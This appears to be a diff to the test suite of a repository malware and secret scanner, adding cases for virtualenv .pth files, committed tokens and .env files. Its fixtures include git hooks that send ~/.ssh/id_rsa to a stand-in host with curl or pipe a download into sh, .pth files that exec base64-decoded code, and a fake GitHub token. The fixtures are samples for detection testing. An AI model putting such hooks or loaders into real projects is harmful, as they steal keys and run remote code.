@@ -123,6 +123,9 @@ CASES = {
     "catch/pth-runs-hidden-code": {"lib/evil.pth": "import base64;exec(base64.b64decode('cHJpbnQoMSk='))\n"},
     "warn/pth-imports-a-module": {"lib/x.pth": "import mymodule\n"},
     "pass/pth-only-paths": {"lib/paths.pth": "/opt/lib\n../src\n"},
+    "pass/virtualenv-pth-files": {".venv/lib/python3.12/site-packages/_virtualenv.pth": "import _virtualenv\n",
+                                  ".venv/lib/python3.12/site-packages/distutils-precedence.pth":
+                                      "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim(); \n"},
     "catch/git-hook-steals-keys": {".husky/pre-commit": "#!/bin/sh\ncat ~/.ssh/id_rsa | curl -s -X POST -d @- https://x.example\n"},
     "catch/git-hook-runs-disguised-file": {".githooks/pre-push": "#!/bin/sh\nnode ./assets/logo.png\n", "assets/logo.png": OBF + "\n"},
     "warn/git-hook-pipes-download": {".husky/post-checkout": "#!/bin/sh\ncurl -s https://x.example/i.sh | sh\n"},
@@ -240,6 +243,24 @@ def special_cases(tmp):
         # malware force-committed under an ignored folder must still be caught
         yield case("catch/git-tracked-in-ignored-folder", setup=lambda d: git_repo(
             d, {".gitignore": "dist/\n", "dist/public/fonts/fa-solid-900.eot": OBF + "\n"}, add=(".gitignore", "-f", "dist")))
+        # a .pth in the project's own (git-ignored) virtualenv runs on every Python start: hidden code there is caught
+        yield case("catch/git-ignored-venv-pth-runs-hidden-code", setup=lambda d: git_repo(
+            d, {".gitignore": ".venv/\n", ".venv/lib/python3.12/site-packages/init.pth": "import base64;exec(base64.b64decode('cHJpbnQoMSk='))\n",
+                ".venv/lib/python3.12/site-packages/_virtualenv.pth": "import _virtualenv\n"}, add=(".gitignore",)))
+        yield case("pass/git-ignored-venv-normal-pth", setup=lambda d: git_repo(
+            d, {".gitignore": ".venv/\n", ".venv/lib/python3.12/site-packages/_virtualenv.pth": "import _virtualenv\n"}, add=(".gitignore",)),
+            expect="clean")
+        # secrets: only what the repository would share counts (an ignored .env is fine, a committed key is not)
+        token = "ghp_" + "Q7mK2xV9pL4nR8sT1wY6zB3cD5fH0jG2aE7u"
+        yield case("warn/committed-github-token", setup=lambda d: git_repo(d, {"src/config.js": "module.exports = { token: '" + token + "' };\n"}),
+                   expect="WARNING")
+        yield case("warn/env-file-not-ignored", setup=lambda d: git_repo(d, {".env": "GITHUB_TOKEN=" + token + "\n"}), expect="WARNING")
+        yield case("pass/ignored-env-file", setup=lambda d: git_repo(d, {".gitignore": ".env\n", ".env": "GITHUB_TOKEN=" + token + "\n"},
+                                                                      add=(".gitignore",)), expect="clean")
+        yield case("pass/placeholder-token", setup=lambda d: git_repo(d, {"README.md": "x\n", "src/a.js": "const t = 'ghp_" + "x" * 36 + "';\n"}),
+                   expect="clean")
+        yield case("pass/private-key-header-in-docs", setup=lambda d: git_repo(d, {"docs/keys.js": "// files start with -----BEGIN OPENSSH PRIVATE KEY-----\nmodule.exports = 1;\n"}),
+                   expect="clean")
         # payload committed inside node_modules must still be scanned in git mode
         yield case("catch/git-tracked-node-modules", setup=lambda d: git_repo(
             d, {"node_modules/x/i.js": "module.exports = {};" + " " * 149 + G_BANG + "x" * 400}, add=("-f", ".")))
